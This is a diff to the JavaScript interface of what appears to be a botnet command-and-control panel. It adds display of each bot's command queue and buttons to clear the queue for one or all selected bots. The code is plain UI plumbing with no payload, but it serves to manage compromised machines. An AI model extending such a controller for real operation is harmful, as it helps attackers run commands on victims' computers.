@@ -38,6 +38,11 @@ function clients_list(){
                             symbol = "fa-apple";
                         }
                     }
+                    var q = "";
+                    $.each(bot.cmd_queue, function(j, cmd){
+                        q += cmd + "\n";
+                    });
+                    $('#cmdq').html(q);
                     $('#botid').val(i);
                     $('#lastResponse').html(bot.last_response);
                     $('#cliOS').html("<i class=\"fa " + symbol + "\"></i> " + bot.OS);
@@ -106,6 +111,20 @@ function delete_bot(e){
     });
 }
 
+function clearq_bot(e){
+    $.ajax({
+        url: '/api/clients/clearq/' + $('#botid').val(),
+        type: 'GET',
+        success: function (data, textStatus, xhr) {
+            $('#cmdq').html("");
+            $('#clearqBot').toggleClass("btn-info").toggleClass("btn-success").html("Done!").prop("disabled", true);
+            setTimeout(function (){
+                $('#clearqBot').toggleClass("btn-info").toggleClass("btn-success").html("Clear Queue").prop("disabled", false);
+            }, 3000);
+        }
+    });
+}
+
 function select_all_checkboxes(e){
     $('input:checkbox[name="botcb"]').each(function(){
         $(this).prop("checked", $('input:checkbox[name="allbot"]').prop("checked"));
@@ -119,6 +138,18 @@ function delete_all_checked(e){
     $('input:checkbox[name="botcb"]:checked').each(function(){
         $.ajax({
             url: '/api/clients/delete/' + $(this).prop("value"),
+            type: 'GET',
+        });
+    });
+}
+
+function clearq_all_checked(e){
+    if (!confirm("Are you sure you want to clear the command queue of all checked bots?")){
+        return;
+    }
+    $('input:checkbox[name="botcb"]:checked').each(function(){
+        $.ajax({
+            url: '/api/clients/clearq/' + $(this).prop("value"),
             type: 'GET',
         });
     });
